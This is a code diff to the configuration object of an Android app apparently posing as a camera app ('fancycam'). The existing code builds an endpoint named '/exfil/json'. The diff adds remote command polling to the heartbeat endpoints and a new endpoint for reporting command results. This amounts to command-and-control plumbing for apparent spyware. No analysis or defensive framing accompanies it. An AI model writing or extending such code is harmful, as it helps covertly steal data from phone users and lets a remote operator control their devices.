@@ -1,4 +1,4 @@
-package com.example.fancycam
+package com.example.fancycam.network
 
 import android.content.Context
 import android.content.SharedPreferences
@@ -72,8 +72,13 @@ object AppConfig {
         return getCandidateEndpoints(context, "/exfil/json")
     }
 
-    fun getHeartbeatEndpoints(context: Context): List<String> {
-        return getCandidateEndpoints(context, "/api/heartbeat")
+    fun getHeartbeatEndpoints(context: Context, pollCommands: Boolean = true): List<String> {
+        val endpoints = getCandidateEndpoints(context, "/api/heartbeat")
+        if (pollCommands) return endpoints
+        return endpoints.map { endpoint ->
+            val separator = if (endpoint.contains('?')) '&' else '?'
+            "${endpoint}${separator}poll_commands=0"
+        }
     }
 
     fun getHealthEndpoints(context: Context): List<String> {
@@ -86,5 +91,9 @@ object AppConfig {
 
     fun getStatusUrl(context: Context): String {
         return "${getBaseUrl(context)}/api/status"
+    }
+
+    fun getCommandResultEndpoints(context: Context): List<String> {
+        return getCandidateEndpoints(context, "/api/commands/result")
     }
 }
